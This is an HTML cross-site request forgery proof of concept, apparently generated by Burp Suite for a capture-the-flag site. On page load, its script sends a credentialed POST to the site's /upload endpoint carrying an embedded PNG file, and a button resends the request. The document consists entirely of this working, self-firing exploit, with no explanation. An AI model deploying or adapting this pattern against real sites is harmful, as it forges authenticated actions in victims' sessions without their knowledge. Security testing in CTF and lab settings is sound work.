<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/ctf.widyasecurity.com\/upload", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/png,image\/svg+xml,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------358215071013670527512231305725");
        xhr.withCredentials = true;
        var body = "-----------------------------358215071013670527512231305725\r\n" + 
          "Content-Disposition: form-data; name=\"qrcode\"; filename=\"testing.png\"\r\n" + 
          "Content-Type: image/png\r\n" + 
          "\r\n" + 
          "\x89PNG\r\n" + 
          "\x1a\n" + 
          "\x00\x00\x00\rIHDR\x00\x00\x00\xfa\x00\x00\x00\xfa\x01\x03\x00\x00\x00\xb2\"\xc8~\x00\x00\x00\x06PLTE\xff\xff\xff\x00\x00\x00U\xc2\xd3~\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x01\xc6IDATh\x81\xed\x99\xbd\x91\xc2@\x0c\x85\xc58p\xe8\x12\\\xca\x96\x86K\xdbR\\\x02\xa1\x03\x0f:==-\x188\xeer\xaf\x140\xb3\xe2#y\xa3\x7fD\xfe\xb3\xab\xba\xddd\xdc\xed\xa5\xe1\xb8\x8dt\xeb\xd2\r\xb0@\x8d\xc9\x3c\xfb%\x9c\x15\xcf\xcdUJ\xe0\x00\x14\xd5u2%U\xef\xee\x91\x02%\xb7\x01\xef\xfe\x00\x08e\x0e\x8b\xa1Rg\xc3\x13\xf8\x02\x88\x0cw\x0b)K\xbd\xfaE\xea\xb3\x03\x91Y\xdb\x80\x80B\xd1\x81\xfd\x92z\xbd\x03Q\xab\x01\\\xd4\x3c\xa6\xa4\x07\xd8{1?9p4\x00o.I \xcc\x95\\\'|\"\xf5\xec\xfbR-\xc2\xb6qwe\xbb\x01\x1e\xd6\x86\x1c\xb3\xf9\x86\x1f\xec&\xdcQ\xb6\xce\x01\xab\xd5P\x0e\xd3 \x84\xf4\xda\x1d\xbd\x1e\xcd^\x12\x08\xc0\x9b\xd8\x8a\x18\xe3\x14d\xc3`YMW\xdd\x87\x18\x8a\xfa\x00Z\xeaY\xaeq\xc8\xf1\xa9X\xade\r\xd0M\x12\x08\xc0\x88\xca\xd4\xd36\x05\xc9\xec\x9c\xa7\xe2\xd2\x0b\xe0\x99$.\x94D\xa6Q7\x9f\x92\x9b#\x01\x1a\xf7\x05NA\xb6g\xad\x8c\xa8\xc8\xcd\x3e\x00d\xd6:k[\x1f\x3c\xb3\xfci3\xcf=\x81\x03\x10b\xc6\xbe\xc0\x9a\xe4-k\xe7P\xd4\x0fP\xa0\xce\xc6\xd2\xcbRl-\xcc\x9e1.&\x10@\xa9\xb3\xd7 D\x90\xf0\xfbh\xee\t\xbc\x02\xeaA\x06\xe9D9\x1dN\xcc\xc1\xe7\x89\xe3\xfc@3\xa4^k\xee\xe2\x87\x9d\xd6\xfd\x13\xf88\xd4\xc8#\x80\xf0\xc4\x9e%\xd2\r\xe0Z\xf9\x1a\xc5\x03\x85\xfa%\x87\x01v\x3cy%Px+n\x11%%\x0e\x1an\xfd\x01\\\x17t\xb9r\xc8\xe1%\'\x81O\x00Wt\xb7\xca\x8a\xf4L\xbdN\x00f\xd6\xc8\xde\xcd\xb7\xaf\x0f\x92\xc0\x0b@\xf9\xe2\xef\xcb\x18zp\xfa\xdb\x878y%\xf0\xdc\xbb\xff\xb0\x1f\xe5\x9a\x14\xe7\x8f\xb9\x13\xbe\x00\x00\x00\x00IEND\xaeB`\x82\r\n" + 
          "-----------------------------358215071013670527512231305725--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
